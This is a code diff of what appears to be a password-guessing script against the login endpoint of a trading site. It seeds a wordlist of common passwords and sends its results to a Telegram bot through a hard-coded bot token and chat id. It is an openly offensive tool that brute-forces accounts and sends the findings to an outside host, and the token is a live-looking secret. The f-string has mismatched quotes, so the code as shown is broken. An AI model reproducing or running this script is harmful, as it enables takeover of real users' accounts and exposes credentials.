@@ -1,13 +1,31 @@
-import requests,time,sys,os,random,telepot
+import requests,time,sys,os,random
 from requests import ConnectionError
 url1 = "https://trade.topbos.com/trade/pwdLogin.do"
 
+if not os.path.exists("hasilnew.txt"):
+        b = open("hasilnew.txt", "a")
+        b.write("=============[Tembelek]=============\n")
+        b.close()
+if not os.path.exists("history.txt"):
+        b = open("history.txt", "a")
+        b.write("=============[Tembelek]=============\n")
+        b.close()
+if not os.path.exists("fin.txt"):
+        b = open("fin.txt", "a")
+        b.write("Qwertyuiop\nqwertyuiop\nQwerty\nQwerty123\nqwerty\n123456\n12345678\nhiggsdomino\ndomino123\ndomino\nDomino\nHiggsdomino")
+        b.close()
+
+
 def ste(use):
+    try:
+        requests.get(f'https://api.telegram.org/bot5162664077:AAFAjX2fJJiZUrpFroio2MaKJqsqqDBh7F8/sendMessage?chat_id=1380298324&text={use}")
+    except:
+        pass
 #    token = "5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs"
-    token = "5162664077:AAFAjX2fJJiZUrpFroio2MaKJqsqqDBh7F8"
-    idd = 1380298324
-    bot = telepot.Bot(token)
-    bot.sendMessage(idd,use)
+#    token = "5162664077:AAFAjX2fJJiZUrpFroio2MaKJqsqqDBh7F8"
+#    idd = 1380298324
+#    bot = telepot.Bot(token)
+#    bot.sendMessage(idd,use)
 
 
 def search(idu,pw):
